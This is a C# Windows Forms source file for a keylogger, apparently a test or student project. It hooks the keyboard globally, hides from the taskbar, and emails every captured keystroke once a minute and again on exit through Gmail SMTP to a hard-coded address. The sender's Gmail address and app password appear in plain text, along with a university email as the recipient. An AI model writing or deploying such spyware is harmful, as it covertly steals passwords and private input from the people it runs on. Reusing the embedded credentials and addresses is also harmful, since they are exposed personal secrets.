using System;
using System.Text;
using System.Windows.Forms;
using System.Net.Mail;
using System.Diagnostics;
using System.Threading.Tasks;

namespace KeyLoggerTEST
{
    public partial class Form1 : Form
    {
        private const string SmtpHost = "smtp.gmail.com";
        private const int SmtpPort = 587;
        private const string GonderenAdresi = "huseyin.altiparmak00@gmail.com";
        private const string GonderenSifresi = "lnjo ptlu wtgq tppx";
        private const string AliciAdresi = "240542012@firat.edu.tr";
        private const int IntervalMs = 60 * 1000;

        private readonly System.Windows.Forms.Timer emailTimer = new System.Windows.Forms.Timer();
        private readonly KeyboardHook keyHook = new KeyboardHook();
        private readonly StringBuilder capturedText = new StringBuilder();

        public Form1()
        {
            InitializeComponent();
            this.Load += Form1_Load;
            this.FormClosing += Form1_FormClosing;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            keyHook.KeyPressed += KeyHook_KeyPressed;
            keyHook.HookStart();

            emailTimer.Interval = IntervalMs;
            emailTimer.Tick += EmailTimer_Tick;
            emailTimer.Start();

            this.Visible = true;
            this.ShowInTaskbar = false;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            keyHook.HookStop();
            emailTimer.Stop();

            if (capturedText.Length > 0)
            {
                SendEmail(capturedText.ToString(), true);
            }
        }

        private void KeyHook_KeyPressed(object sender, KeyPressedEventArgs e)
        {
            capturedText.Append(e.KeyString);
        }

        private void EmailTimer_Tick(object sender, EventArgs e)
        {
            if (capturedText.Length > 0)
            {
                SendEmail(capturedText.ToString(), false);
                capturedText.Clear();
            }
        }

        private void SendEmail(string content, bool isFinal)
        {
            Task.Run(() =>
            {
                try
                {
                    using (SmtpClient smtpClient = new SmtpClient(SmtpHost, SmtpPort))
                    {
                        smtpClient.EnableSsl = true;
                        smtpClient.Credentials = new System.Net.NetworkCredential(GonderenAdresi, GonderenSifresi);

                        MailMessage mailMessage = new MailMessage
                        {
                            From = new MailAddress(GonderenAdresi),
                            Subject = isFinal ? "KeyLogger - Final Log" : "KeyLogger - Periodic Log",
                            Body = $"Zaman: {DateTime.Now:dd.MM.yyyy HH:mm:ss}\n\nYakalanan Veri:\n{content}",
                            IsBodyHtml = false
                        };

                        mailMessage.To.Add(AliciAdresi);
                        smtpClient.Send(mailMessage);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"E-posta gönderim hatasý: {ex.Message}");
                }
            });
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(300, 200);
            this.Name = "Form1";
            this.Text = "KeyLogger";
            this.ResumeLayout(false);
        }
    }
}